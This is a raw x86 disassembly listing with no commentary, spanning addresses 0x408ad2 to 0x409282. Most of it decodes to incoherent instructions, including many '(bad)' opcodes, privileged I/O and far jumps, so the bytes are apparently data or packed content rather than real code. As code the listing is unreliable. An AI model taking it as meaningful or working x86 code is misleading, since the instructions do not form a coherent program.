  408ad2:	adc    cl,bh
  408ad4:	pop    eax
  408ad5:	repnz xor esp,DWORD PTR [edx]
  408ad8:	adc    eax,0xe957b5b3
  408add:	push   ds
  408ade:	mov    bh,BYTE PTR ds:0x8db10b09
  408ae4:	loopne 0x408b0e
  408ae6:	jecxz  0x408b0a
  408ae8:	rcl    eax,0x78
  408aeb:	call   0xbc51:0x36d2b4db
  408af2:	xchg   BYTE PTR [esi],cl
  408af4:	jnp    0x408a95
  408af6:	out    dx,eax
  408af7:	push   ebx
  408af8:	sar    BYTE PTR [edi],1
  408afa:	pop    ebp
  408afb:	xchg   ebp,eax
  408afc:	call   0xa0cfde1c
  408b01:	je     0x408b18
  408b03:	push   0x40
  408b05:	add    al,0x80
  408b07:	or     DWORD PTR [ecx],0xb2079f21
  408b0d:	mov    cl,0xdf
  408b0f:	cmp    ch,bl
  408b11:	fidiv  WORD PTR [ebx-0x4a]
  408b14:	out    dx,al
  408b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b16:	gs sbb eax,0x13075c2c
  408b1c:	cmp    ecx,edi
  408b1e:	mov    edi,0x73e4e1c7
  408b23:	mov    cl,0x8
  408b25:	inc    ebx
  408b26:	dec    esp
  408b27:	add    BYTE PTR [ebx-0x2c],ch
  408b2a:	(bad)  
  408b2b:	pop    edi
  408b2c:	or     ecx,eax
  408b2e:	xor    ecx,DWORD PTR [ebp-0x526cd7ef]
  408b34:	xchg   ebp,eax
  408b35:	test   al,0x26
  408b37:	fcmovnbe st,st(1)
  408b39:	push   esp
  408b3a:	jge    0x408aed
  408b3c:	mov    eax,0x2d7ad6c0
  408b41:	jbe    0x408b9d
  408b43:	dec    eax
  408b44:	dec    ebp
  408b45:	mov    ecx,0x15a81d6f
  408b4a:	jmp    0x225a:0x7b7701b3
  408b51:	pusha  
  408b52:	cmp    ecx,DWORD PTR [edi+0x66a7c41]
  408b58:	je     0x408af3
  408b5a:	add    al,0x33
  408b5c:	adc    esp,DWORD PTR [eax+edx*8+0x2b]
  408b60:	add    ah,BYTE PTR [ecx+edi*2]
  408b63:	outs   dx,DWORD PTR ds:[esi]
  408b64:	(bad)  
  408b65:	push   0x2
  408b67:	lock sahf 
  408b69:	or     BYTE PTR [eax+0x44],al
  408b6c:	adc    esi,DWORD PTR [eax-0x52]
  408b6f:	ins    BYTE PTR es:[edi],dx
  408b70:	inc    eax
  408b71:	enter  0xa0ab,0xf
  408b75:	rcr    DWORD PTR [esi+0x42],1
  408b78:	les    ebp,FWORD PTR [edx+0x2d261025]
  408b7e:	or     bh,BYTE PTR [ebx+eiz*2-0x12]
  408b82:	push   esp
  408b83:	cmp    ecx,DWORD PTR [eax+edi*2]
  408b86:	xchg   DWORD PTR [eax+0x6b],ebp
  408b89:	sbb    ecx,DWORD PTR [edi]
  408b8b:	jne    0x408bd6
  408b8d:	jmp    0xf7683351
  408b92:	mov    dh,0x34
  408b94:	es popa 
  408b96:	stos   BYTE PTR es:[edi],al
  408b97:	aam    0x9e
  408b99:	cmp    DWORD PTR ds:[eax-0x275ab4ca],edx
  408ba0:	cmp    edi,esi
  408ba2:	push   ds
  408ba3:	inc    esi
  408ba4:	pmaddwd mm2,QWORD PTR [ebx-0x2e]
  408ba8:	sub    eax,ecx
  408baa:	fistp  DWORD PTR ds:0xb4a6ffce
  408bb0:	push   cs
  408bb1:	cwde   
  408bb2:	pop    ds
  408bb3:	jp     0x408bad
  408bb5:	test   DWORD PTR [edx],0x39a130ee
  408bbb:	xor    eax,0x7cbb4858
  408bc0:	hlt    
  408bc1:	pop    edi
  408bc2:	xor    eax,0x3f5aeb12
  408bc7:	mov    ah,0xb
  408bc9:	lods   eax,DWORD PTR ds:[esi]
  408bca:	popf   
  408bcb:	xchg   DWORD PTR [ecx],ebx
  408bcd:	pop    ds
  408bce:	pop    ecx
  408bcf:	lods   eax,DWORD PTR ds:[esi]
  408bd0:	pop    ds
  408bd1:	mov    ah,0x79
  408bd3:	add    ecx,DWORD PTR [edx-0x5]
  408bd6:	cmp    eax,0x310a353f
  408bdb:	and    eax,0xdcd0be5
  408be0:	(bad)  
  408be1:	mov    eax,0xd7d1fac9
  408be6:	dec    ecx
  408be7:	mov    ah,BYTE PTR [eax-0x59]
  408bea:	aas    
  408beb:	popf   
  408bec:	out    dx,al
  408bed:	or     DWORD PTR [edi],edi
  408bef:	push   ebp
  408bf0:	aam    0x71
  408bf2:	push   0x51943308
  408bf7:	cdq    
  408bf8:	(bad)  
  408bf9:	pop    edx
  408bfa:	das    
  408bfb:	mov    al,0xda
  408bfd:	in     eax,0x9f
  408bff:	sbb    dl,bl
  408c01:	ret    
  408c02:	sub    eax,0x9296e28f
  408c07:	ins    DWORD PTR es:[edi],dx
  408c08:	xor    ch,BYTE PTR [edx-0x30]
  408c0b:	or     BYTE PTR [ebx-0xaf77b73],bh
  408c11:	jb     0x408c45
  408c13:	add    BYTE PTR [ecx+0x458b0845],cl
  408c19:	hlt    
  408c1a:	mov    ecx,DWORD PTR [ebp+0x14]
  408c1d:	xor    eax,esi
  408c1f:	add    eax,edi
  408c21:	imul   eax,DWORD PTR [ecx]
  408c24:	mov    ecx,DWORD PTR [ebp-0x4]
  408c27:	mov    edx,DWORD PTR [ebp+0x8]
  408c2a:	xor    ecx,esi
  408c2c:	lea    ecx,[ecx+edx*1+0x3272f5]
  408c33:	cmp    ecx,eax
  408c35:	jne    0x406849
  408c3b:	jmp    0x40afcd
  408c40:	or     eax,0xbf3c7fd1
  408c45:	mov    cl,BYTE PTR [edx]
  408c47:	into   
  408c48:	and    bl,BYTE PTR [ebx]
  408c4a:	and    eax,0x5b156a2a
  408c4f:	mov    ds:0x8383189c,al
  408c54:	or     al,0x5e
  408c56:	add    DWORD PTR [ebx-0x3a3453a3],0xffffffab
  408c5d:	adc    DWORD PTR [ecx+0x30],ebx
  408c60:	inc    edi
  408c61:	mov    ds:0x644b6245,eax
  408c66:	clc    
  408c67:	mov    dl,0x32
  408c69:	dec    esp
  408c6a:	popf   
  408c6b:	stos   DWORD PTR es:[edi],eax
  408c6c:	ins    BYTE PTR es:[edi],dx
  408c6d:	enter  0x147f,0x54
  408c71:	outs   dx,DWORD PTR ds:[esi]
  408c72:	mov    ah,0x75
  408c74:	xchg   esi,eax
  408c75:	ja     0x408c2c
  408c77:	call   0xa45f:0xfb1e5610
  408c7e:	lea    edi,[esi+0x42]
  408c81:	leave  
  408c82:	stc    
  408c83:	push   edi
  408c84:	daa    
  408c85:	mov    DWORD PTR [ebp-0x1f3e1049],esi
  408c8b:	ss jle 0x408c47
  408c8e:	push   ebx
  408c8f:	mov    eax,0x1252b2cc
  408c94:	mov    cl,0x85
  408c96:	cdq    
  408c97:	popa   
  408c98:	push   edi
  408c99:	std    
  408c9a:	stos   BYTE PTR es:[edi],al
  408c9b:	jle    0x408cec
  408c9d:	lds    edi,FWORD PTR [esp+edx*8]
  408ca0:	mov    ah,0x9a
  408ca2:	jb     0x408cc7
  408ca4:	jg     0x408c7b
  408ca6:	mov    ebx,db1
  408ca9:	das    
  408caa:	mov    ch,0x28
  408cac:	sub    BYTE PTR [edx+ebx*2-0x4f],cl
  408cb0:	jmp    0x408c6c
  408cb2:	xor    BYTE PTR [ebx+ebp*1-0x6e054dc3],dh
  408cb9:	pop    ds
  408cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cbb:	pop    edi
  408cbc:	jbe    0x408d31
  408cbe:	daa    
  408cbf:	mov    al,ds:0xd06fabe
  408cc4:	pop    es
  408cc5:	pushf  
  408cc6:	pop    edi
  408cc7:	pushf  
  408cc8:	out    dx,al
  408cc9:	mov    ds:0x8c04d7f3,al
  408cce:	add    al,0x98
  408cd0:	xor    al,BYTE PTR [ebx]
  408cd2:	add    ah,cl
  408cd4:	cs aaa 
  408cd6:	fdiv   QWORD PTR [ebx-0x5b]
  408cd9:	and    al,0xa7
  408cdb:	xor    bl,bl
  408cdd:	retf   
  408cde:	jp     0x408c8a
  408ce0:	pushf  
  408ce1:	jne    0x408c7f
  408ce3:	mov    ebx,0xcab837b0
  408ce8:	int3   
  408ce9:	and    eax,0x68c03c44
  408cee:	sub    eax,0x61f867de
  408cf3:	xchg   ecx,eax
  408cf4:	push   0x2e62afbd
  408cf9:	fcom   DWORD PTR [eax+ebx*8]
  408cfc:	iret   
  408cfd:	les    esi,FWORD PTR [edi-0x488eaf89]
  408d03:	cld    
  408d04:	and    DWORD PTR [edx],0x73
  408d07:	imul   esp,ebx,0x95520665
  408d0d:	jne    0x408ce5
  408d0f:	shl    BYTE PTR [edx],1
  408d11:	sub    al,0x45
  408d13:	mov    esp,0x2d275842
  408d18:	repz or BYTE PTR [edi-0x9],dh
  408d1c:	jnp    0x408d08
  408d1e:	sbb    DWORD PTR [esi+0x78],edi
  408d21:	pushf  
  408d22:	jnp    0x408d15
  408d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d25:	xchg   DWORD PTR [ebx+0x39],ebx
  408d28:	push   esp
  408d29:	js     0x408cef
  408d2b:	jne    0x408d0e
  408d2d:	icebp  
  408d2e:	xor    al,BYTE PTR [ecx+0x39]
  408d31:	push   ss
  408d32:	jmp    0x408ce0
  408d34:	(bad)
  408d37:	push   ds
  408d38:	xor    BYTE PTR [ebp+0x0],al
  408d3b:	outs   dx,DWORD PTR ds:[esi]
  408d3c:	mov    al,0xfd
  408d3e:	ins    DWORD PTR es:[edi],dx
  408d3f:	push   edx
  408d40:	aad    0x6d
  408d42:	retf   0x229b
  408d45:	or     DWORD PTR ds:0xb3b9b46b,eax
  408d4b:	loop   0x408da9
  408d4d:	push   ebx
  408d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d4f:	sub    WORD PTR [esi+0x46ecb21f],bx
  408d56:	sbb    ecx,DWORD PTR [ebx]
  408d58:	mov    al,ds:0x5c8a0c3d
  408d5d:	lea    ebx,[ecx-0x48]
  408d60:	jne    0x408d76
  408d62:	je     0x408d64
  408d64:	xchg   ecx,eax
  408d65:	pop    ds
  408d66:	push   ebp
  408d67:	sbb    eax,0x178db994
  408d6c:	inc    esi
  408d6d:	test   dh,bl
  408d6f:	mov    edx,0x83c1ef0d
  408d74:	mov    ebp,0xf62cf3
  408d79:	shr    BYTE PTR [edx-0x16],cl
  408d7c:	xchg   edi,eax
  408d7d:	shl    ah,0x21
  408d80:	imul   edi,DWORD PTR [edx+0xfbcd06d],0x13081c13
  408d8a:	or     eax,0xa336fc3a
  408d8f:	loop   0x408d3e
  408d91:	mov    ds:0x6c015409,al
  408d96:	stos   DWORD PTR es:[edi],eax
  408d97:	ins    BYTE PTR es:[edi],dx
  408d98:	ja     0x408d7f
  408d9a:	adc    ax,0xac77
  408d9e:	cmp    ah,cl
  408da0:	adc    edi,edx
  408da2:	inc    ebp
  408da3:	sub    ch,BYTE PTR [edi+0x68]
  408da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408da7:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408da9:	cld    
  408daa:	xchg   BYTE PTR [edx+0x36f21afa],bl
  408db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408db1:	or     ebx,esp
  408db3:	setle  BYTE PTR [eax-0x4678288a]
  408dba:	cmc    
  408dbb:	jecxz  0x408dc5
  408dbd:	rol    DWORD PTR [ecx+0x13],0xae
  408dc1:	push   esp
  408dc2:	jg     0x408ded
  408dc4:	dec    esi
  408dc5:	jnp    0x408d6c
  408dc7:	retf   
  408dc8:	or     ebp,DWORD PTR [ecx]
  408dca:	pop    ds
  408dcb:	mov    ?,WORD PTR [ebx-0x41]
  408dce:	push   eax
  408dcf:	test   BYTE PTR [ebx+0x3a495c],0xeb
  408dd6:	jne    0x408e13
  408dd8:	xchg   esp,eax
  408dd9:	and    BYTE PTR [ecx+0x72],bl
  408ddc:	jmp    0x8a92dc8
  408de1:	nop
  408de2:	mov    WORD PTR [ebp-0x2c],?
  408de5:	scas   al,BYTE PTR es:[edi]
  408de6:	data16 (bad) 
  408de8:	ins    DWORD PTR es:[edi],dx
  408de9:	test   al,0xfa
  408deb:	mov    dl,BYTE PTR [eax-0x7014e145]
  408df1:	mov    esi,DWORD PTR es:[ecx]
  408df4:	cmp    dh,bl
  408df6:	clc    
  408df7:	inc    ebx
  408df8:	xor    eax,0x8f5fa055
  408dfd:	cs pop esp
  408dff:	pop    eax
  408e00:	iret   
  408e01:	aas    
  408e02:	mov    ecx,0xe7c75555
  408e07:	mov    ch,bh
  408e09:	mov    edi,esp
  408e0b:	cld    
  408e0c:	(bad)  
  408e0d:	in     al,dx
  408e0e:	mov    edx,0x28dfa027
  408e13:	cmp    ah,dh
  408e15:	inc    esi
  408e16:	add    eax,0xab75849a
  408e1b:	lea    ecx,[edi-0x787923ce]
  408e21:	sar    BYTE PTR es:[ecx-0x6ac31968],1
  408e28:	pop    esi
  408e29:	gs pop esp
  408e2b:	xlat   BYTE PTR ds:[ebx]
  408e2c:	shl    ebp,1
  408e2e:	mov    BYTE PTR [ecx-0x1b43a1ca],dh
  408e34:	xor    ecx,DWORD PTR [ebx]
  408e36:	mov    WORD PTR [ebx],?
  408e38:	lods   eax,DWORD PTR ds:[esi]
  408e39:	repnz xor eax,0x602a6faf
  408e3f:	imul   edi,DWORD PTR [ebp-0x9],0x5e
  408e43:	mov    eax,ds:0x321468e1
  408e48:	(bad)  
  408e49:	xor    eax,DWORD PTR [ebp+edi*1-0x2b]
  408e4d:	xor    eax,DWORD PTR [esi+0x1ff5e774]
  408e53:	cmp    eax,0xb0d9cc22
  408e58:	sub    dl,bh
  408e5a:	xor    esi,DWORD PTR [edx+0x13]
  408e5d:	add    DWORD PTR [eax+0x36],0x5d
  408e61:	outs   dx,BYTE PTR ds:[esi]
  408e62:	pop    ds
  408e63:	out    0x3,al
  408e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e66:	sbb    DWORD PTR [ebp+0x7fe2746e],eax
  408e6c:	mov    ah,0x54
  408e6e:	jle    0x408ea3
  408e70:	es pop esp
  408e72:	data16 mov dl,BYTE PTR [ebx+ebx*8-0x2a]
  408e77:	cli    
  408e78:	loop   0x408e75
  408e7a:	pop    es
  408e7b:	fcom   st(5)
  408e7d:	push   ebx
  408e7e:	xchg   edx,eax
  408e7f:	mov    dh,0xcb
  408e81:	jno    0x408e3c
  408e83:	push   edi
  408e84:	out    0xd6,eax
  408e86:	adc    eax,0x5d6f2ff8
  408e8b:	imul   DWORD PTR [ebp-0x52]
  408e8e:	mov    al,ds:0x53d40819
  408e93:	mov    DWORD PTR [ebx+0x3152d73e],eax
  408e99:	loopne 0x408eee
  408e9b:	ret    
  408e9c:	jl     0x3c2b5ae0
  408ea2:	hlt    
  408ea3:	lods   eax,DWORD PTR ds:[esi]
  408ea4:	rcl    BYTE PTR [ebx+edx*4+0x7e],1
  408ea8:	mov    ds:0x90254734,al
  408ead:	mov    edi,0x45f2364
  408eb2:	add    bh,dl
  408eb4:	adc    BYTE PTR [esi],ah
  408eb6:	and    BYTE PTR [esi+0x5b],al
  408eb9:	add    eax,0xf08decbc
  408ebe:	jb     0x408e5f
  408ec0:	outs   dx,DWORD PTR ds:[esi]
  408ec1:	std    
  408ec2:	scas   eax,DWORD PTR es:[edi]
  408ec3:	fisubr WORD PTR [ebx-0x1e]
  408ec6:	lock dec edi
  408ec8:	jp     0x408e65
  408eca:	or     DWORD PTR [ebx-0x6b],ebp
  408ecd:	les    eax,FWORD PTR [esi+0x2e]
  408ed0:	add    ecx,0xffffffae
  408ed3:	mov    ah,0x73
  408ed5:	dec    esi
  408ed6:	xchg   esp,eax
  408ed7:	ret    
  408ed8:	in     al,0x2e
  408eda:	mov    dl,BYTE PTR [esp+ecx*8+0x44]
  408ede:	dec    edx
  408edf:	int3   
  408ee0:	cmp    bl,ch
  408ee2:	xor    BYTE PTR [edx+eiz*1+0x26],bh
  408ee6:	idiv   BYTE PTR [edi+0x46cc8d01]
  408eec:	or     al,0xe1
  408eee:	push   edx
  408eef:	add    DWORD PTR [edx+0x232f2235],edi
  408ef5:	xlat   BYTE PTR ds:[ebx]
  408ef6:	cli    
  408ef7:	mov    eax,0x55eb5305
  408efc:	je     0x408f40
  408efe:	lahf   
  408eff:	leave  
  408f00:	jbe    0x408ed7
  408f02:	int3   
  408f03:	ret    
  408f04:	pop    ebp
  408f05:	out    dx,al
  408f06:	or     DWORD PTR [esi],ebx
  408f08:	les    edx,FWORD PTR [ecx+0x66]
  408f0b:	jmp    0x408ef2
  408f0d:	or     BYTE PTR [esi-0x17],dh
  408f10:	nop
  408f11:	into   
  408f12:	push   ss
  408f13:	adc    eax,DWORD PTR [esi-0x4e]
  408f16:	sub    ecx,ebx
  408f18:	das    
  408f19:	add    dh,BYTE PTR [esi]
  408f1b:	scas   al,BYTE PTR es:[edi]
  408f1c:	jno    0x408f71
  408f1e:	cmp    DWORD PTR [edi+eax*4],eax
  408f21:	pushf  
  408f22:	mov    esp,0x72cdfd18
  408f27:	jge    0x408f07
  408f29:	jnp    0x408efb
  408f2b:	jle    0x408f73
  408f2d:	mov    ah,0x2d
  408f2f:	shl    ebx,1
  408f31:	mov    ds:0xcaaaee2c,al
  408f36:	mov    bh,0xf1
  408f38:	mov    WORD PTR [ebx+0x40c277e6],es
  408f3e:	or     eax,0xd3114a17
  408f43:	inc    DWORD PTR [ecx+0x6ba3de09]
  408f49:	shr    DWORD PTR [ebp-0x8],0x87
  408f4d:	ja     0x408f44
  408f4f:	out    0xb2,eax
  408f51:	out    dx,eax
  408f52:	mov    al,0x2a
  408f54:	xchg   esp,eax
  408f55:	(bad)  
  408f56:	and    DWORD PTR [edi*4+0x312a99e3],eax
  408f5d:	cmc    
  408f5e:	in     al,0xf8
  408f60:	inc    eax
  408f61:	jbe    0x408f07
  408f63:	and    cl,bh
  408f65:	(bad)  
  408f66:	out    0x1a,al
  408f68:	xor    BYTE PTR [ebp+esi*2+0x1d],dl
  408f6c:	pusha  
  408f6d:	lods   eax,DWORD PTR ds:[esi]
  408f6e:	int    0x75
  408f70:	jo     0x408f97
  408f72:	lods   eax,DWORD PTR ds:[esi]
  408f73:	jbe    0x408fcc
  408f75:	xor    DWORD PTR [bp-0x466],ecx
  408f7a:	leave  
  408f7b:	stc    
  408f7c:	inc    eax
  408f7d:	mov    al,0x73
  408f7f:	clc    
  408f80:	maxps  xmm1,XMMWORD PTR [edx+edx*4+0x44a3c874]
  408f88:	mov    WORD PTR [eax],gs
  408f8a:	ins    DWORD PTR es:[edi],dx
  408f8b:	mov    dh,0x96
  408f8d:	(bad)  
  408f8e:	fnstsw WORD PTR [edi+0x12]
  408f91:	jo     0x408f13
  408f93:	lea    eax,[edi+ecx*2-0x3f]
  408f97:	dec    edi
  408f98:	dec    edx
  408f99:	adc    DWORD PTR [edx+ecx*4],0x2
  408f9d:	mov    dh,0x3b
  408f9f:	jecxz  0x408f7c
  408fa1:	fs jg  0x408fdd
  408fa4:	dec    ebx
  408fa5:	or     eax,0xc5a2a56d
  408faa:	popf   
  408fab:	jno    0x408fd5
  408fad:	jo     0x408f90
  408faf:	cmp    al,0xd1
  408fb1:	xchg   DWORD PTR [eax-0x25b15b04],esi
  408fb7:	cmp    BYTE PTR [edi-0x5bac390e],dl
  408fbd:	push   es
  408fbe:	jnp    0x408f78
  408fc0:	adc    al,0x10
  408fc2:	mov    WORD PTR [edx-0x5f],ss
  408fc5:	jbe    0x408f9e
  408fc7:	lahf   
  408fc8:	xor    eax,0x6c621534
  408fcd:	inc    eax
  408fce:	xor    DWORD PTR [edx],0x23ce495e
  408fd4:	pop    edx
  408fd5:	ja     0x408fde
  408fd7:	addr16 dec edi
  408fd9:	fs fcmovnb st,st(6)
  408fdc:	and    edi,DWORD PTR [eax+0x75]
  408fdf:	jb     0x408fff
  408fe1:	pop    edi
  408fe2:	fucom  st(4)
  408fe4:	cmp    DWORD PTR [edx-0x3520d87f],esp
  408fea:	push   ecx
  408feb:	cmp    ch,cl
  408fed:	fstp   DWORD PTR [ebp+0xb]
  408ff0:	or     edi,ebx
  408ff2:	retf   
  408ff3:	sbb    BYTE PTR [eax],dl
  408ff5:	pop    esp
  408ff6:	dec    eax
  408ff8:	jle    0x409031
  408ffa:	jle    0x40902e
  408ffc:	pop    edi
  408ffd:	ret    0x99f0
  409000:	mov    edx,0x1f40b1ec
  409005:	pop    eax
  409006:	daa    
  409007:	loop   0x409031
  409009:	push   esp
  40900a:	int    0x95
  40900c:	in     al,dx
  40900d:	mov    ebx,0x7f3c4996
  409012:	push   0x36
  409014:	and    ecx,DWORD PTR [ecx-0x1d92785f]
  40901a:	cdq    
  40901b:	fadd   st(3),st
  40901d:	stos   DWORD PTR es:[edi],eax
  40901e:	(bad)  
  409020:	xchg   esi,eax
  409021:	push   ebx
  409022:	les    ecx,FWORD PTR [ebx+0x58]
  409025:	jl     0x40904c
  409027:	mov    ecx,0x747ea24
  40902c:	or     bh,dh
  40902e:	push   ds
  40902f:	dec    ebp
  409030:	inc    ecx
  409031:	or     esi,edx
  409033:	jne    0x409020
  409035:	push   ds
  409036:	addr16 (bad) 
  409038:	adc    ah,BYTE PTR [esi]
  40903a:	jne    0x409006
  40903c:	add    al,0x2d
  40903e:	or     DWORD PTR [ebx+0x6],ecx
  409041:	daa    
  409042:	jg     0x408ff1
  409044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409045:	push   0x7a
  409047:	push   cs
  409048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409049:	retf   0xd81f
  40904c:	mov    bl,0x8c
  40904e:	lods   eax,DWORD PTR ds:[esi]
  40904f:	xor    ebx,DWORD PTR [eax]
  409051:	sub    al,0x36
  409053:	and    BYTE PTR [ecx+0x49068a87],dh
  409059:	push   0xf1caff56
  40905e:	jnp    0x409072
  409060:	ins    DWORD PTR es:[edi],dx
  409061:	or     eax,0x990edcf1
  409066:	inc    ecx
  409067:	mov    dl,0xdb
  409069:	jno    0x408ff8
  40906b:	dec    ebp
  40906c:	(bad)  
  40906d:	push   eax
  40906e:	adc    DWORD PTR [esi+0x3b],edx
  409071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409072:	mov    ebp,0xa3ad6bd5
  409077:	std    
  409078:	jne    0x408ffa
  40907a:	aaa    
  40907b:	jecxz  0x409094
  40907d:	je     0x409033
  40907f:	inc    esi
  409080:	fisttp WORD PTR [ecx-0xfcf7e90]
  409086:	pop    es
  409087:	inc    edi
  409088:	mov    eax,ds:0xdc5b1527
  40908d:	fdiv   QWORD PTR [ebp+0x2e]
  409090:	sahf   
  409091:	loop   0x409019
  409093:	cwde   
  409094:	or     BYTE PTR [esi+ebp*4],ah
  409097:	ror    BYTE PTR [edi+edx*2+0x3bcd54f5],1
  40909e:	mov    WORD PTR [edi-0x4e2bcd3c],es
  4090a4:	test   DWORD PTR [edx+eiz*2-0x46],ebp
  4090a8:	rcl    DWORD PTR [edi+0x2d],0x96
  4090ac:	mov    dl,0x55
  4090ae:	fwait
  4090af:	mov    esp,0xd97781fc
  4090b4:	lea    esi,[edi-0x42768436]
  4090ba:	dec    eax
  4090bb:	popf   
  4090bc:	lods   eax,DWORD PTR ds:[esi]
  4090bd:	push   es
  4090be:	repnz adc al,0xcf
  4090c1:	mov    es:0x41a2b629,eax
  4090c7:	int    0x41
  4090c9:	std    
  4090ca:	mov    ch,0x54
  4090cc:	jmp    0x4167:0x912b6409
  4090d3:	rcr    BYTE PTR [ebp-0x7e],cl
  4090d6:	ret    
  4090d7:	xchg   BYTE PTR [edx-0x47],ah
  4090da:	sub    al,0x3d
  4090dc:	jne    0x4090e6
  4090de:	popf   
  4090df:	mov    esp,DWORD PTR [ebx]
  4090e1:	rcl    BYTE PTR [ebx],1
  4090e3:	sub    al,0x23
  4090e5:	lock dec eax
  4090e7:	ins    BYTE PTR es:[edi],dx
  4090e8:	push   edx
  4090e9:	out    0x71,eax
  4090eb:	test   DWORD PTR [eax],0xddfcaf94
  4090f1:	adc    ecx,DWORD PTR [ebp+0x49a7e06e]
  4090f7:	push   cs
  4090f8:	js     0x40915b
  4090fa:	inc    esi
  4090fb:	push   cs
  4090fc:	jmp    0x1967e397
  409101:	sar    DWORD PTR [ebx-0x544ebb0a],cl
  409107:	jbe    0x40914a
  409109:	outs   dx,DWORD PTR ds:[esi]
  40910a:	mov    ds:0xacc335a8,al
  40910f:	jl     0x409167
  409111:	jbe    0x4090be
  409113:	adc    al,0x98
  409115:	xor    ebp,esp
  409117:	jno    0x409117
  409119:	mov    al,ds:0xabf9ebf1
  40911e:	sahf   
  40911f:	inc    ebx
  409120:	pop    es
  409121:	inc    ebx
  409122:	mov    cl,0x32
  409124:	inc    edx
  409125:	ret    
  409126:	mov    WORD PTR [edi-0x78],?
  409129:	mov    edx,0x7057b4e6
  40912e:	inc    ebp
  40912f:	sub    ah,bh
  409131:	push   es
  409132:	jb     0x409108
  409134:	pop    es
  409135:	cmp    dh,BYTE PTR [eax-0x302bb956]
  40913b:	push   esp
  40913c:	into   
  40913d:	mov    bl,0xab
  40913f:	or     DWORD PTR [eax-0x1bba3dca],ebx
  409145:	mov    bl,0xe7
  409147:	nop
  409148:	or     edi,ebp
  40914a:	rol    DWORD PTR [ecx],cl
  40914c:	dec    ebp
  40914d:	pop    ebx
  40914e:	stc    
  40914f:	inc    ebx
  409150:	mov    al,ds:0xe3bec40c
  409155:	add    DWORD PTR ss:[esi],ebp
  409158:	cli    
  409159:	lahf   
  40915a:	aas    
  40915b:	sub    BYTE PTR [esi+0x3d],al
  40915e:	loope  0x409196
  409160:	xchg   edx,eax
  409161:	or     eax,0xf6a1f08f
  409166:	(bad)  
  409167:	or     ah,ch
  409169:	stc    
  40916a:	call   0xbcd09384
  40916f:	cmp    BYTE PTR [ebp-0x2dfac437],dl
  409175:	mov    cl,0x71
  409177:	push   0x65b90e13
  40917c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917d:	sbb    edi,DWORD PTR [ebx+0x3a]
  409180:	mov    ecx,0x3550e220
  409185:	(bad)  
  409186:	in     eax,dx
  409187:	mov    es,WORD PTR [eax+0x39959e06]
  40918d:	inc    ebp
  40918e:	sub    BYTE PTR [edx+0x2954aa2e],dl
  409194:	ja     0x40920a
  409196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409197:	mov    ebp,0x1ab64e50
  40919c:	in     al,0x2f
  40919e:	fst    DWORD PTR [edx+0x387d07cc]
  4091a4:	mov    ds:0x418c1e28,al
  4091a9:	xchg   edx,eax
  4091aa:	ror    BYTE PTR [edi-0x2857d921],1
  4091b0:	add    eax,0xffd4b9ba
  4091b5:	fnstsw WORD PTR [ecx]
  4091b7:	and    BYTE PTR [ecx],ah
  4091b9:	or     eax,0x2c088035
  4091be:	rcr    BYTE PTR [eax],0xe6
  4091c1:	cwde   
  4091c2:	jae    0x409184
  4091c4:	and    bh,cl
  4091c6:	mov    cl,BYTE PTR [edi+0x4c8fe50a]
  4091cc:	mov    eax,ds:0x2bd808c9
  4091d1:	stos   DWORD PTR es:[edi],eax
  4091d2:	(bad)  
  4091d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d4:	push   0x4501923d
  4091d9:	call   0x7aaad472
  4091de:	(bad)  
  4091df:	std    
  4091e0:	jp     0x4091ed
  4091e2:	add    ch,ch
  4091e4:	jmp    0x816b44a4
  4091e9:	mov    ebp,DWORD PTR [edi+0x2022edd1]
  4091ef:	xor    DWORD PTR [ebx],esi
  4091f1:	enter  0x7ade,0x96
  4091f5:	jecxz  0x409212
  4091f7:	jae    0x409210
  4091f9:	ins    DWORD PTR es:[edi],dx
  4091fa:	ror    BYTE PTR [edi],cl
  4091fc:	mov    bl,0x41
  4091fe:	jno    0x40918a
  409200:	xchg   ecx,eax
  409201:	cwde   
  409202:	cdq    
  409203:	inc    ebp
  409204:	aam    0x22
  409206:	push   ss
  409207:	psubb  mm6,QWORD PTR [ebp+0x1e8db3cd]
  40920e:	cmp    bl,BYTE PTR [eax-0x161000ce]
  409214:	sub    BYTE PTR [ebx+0x3a803567],ah
  40921a:	xor    al,0xc6
  40921c:	std    
  40921d:	imul   edi,DWORD PTR [esi-0x5c69efec],0x74
  409224:	jb     0x4091b7
  409226:	cs repnz into 
  409229:	out    dx,eax
  40922a:	or     edi,0xe3e8acd2
  409230:	pop    es
  409231:	jns    0x409291
  409233:	test   bh,0xf
  409236:	loop   0x409219
  409238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409239:	test   BYTE PTR [ecx],bh
  40923b:	shl    DWORD PTR [edx+edi*4],cl
  40923e:	jg     0x409222
  409240:	xlat   BYTE PTR ds:[ebx]
  409241:	dec    edi
  409242:	mov    BYTE PTR [eax],bl
  409244:	xchg   DWORD PTR [di-0x2],ecx
  409248:	call   DWORD PTR [ebp-0x2895737d]
  40924e:	add    DWORD PTR [ebx],edi
  409250:	or     ecx,DWORD PTR [edx]
  409252:	sub    edi,esi
  409254:	fwait
  409255:	sub    eax,0x614e548f
  40925a:	dec    eax
  40925b:	xchg   ebx,eax
  40925c:	mov    eax,ds:0xa1998c25
  409261:	pop    edi
  409262:	(bad)  
  409263:	lahf   
  409264:	sbb    BYTE PTR [eax+ebx*1-0x20],0x1c
  409269:	in     al,dx
  40926a:	and    eax,edi
  40926c:	push   eax
  40926d:	fcom   QWORD PTR [ecx+0x18901ba3]
  409273:	fstp   TBYTE PTR [edx]
  409275:	call   0xc86b:0x1a9d2578
  40927c:	inc    eax
  40927d:	fild   WORD PTR [ebp+0x28]
  409280:	jmp    0x4092fe
  409282:	jbe    0x4092d0
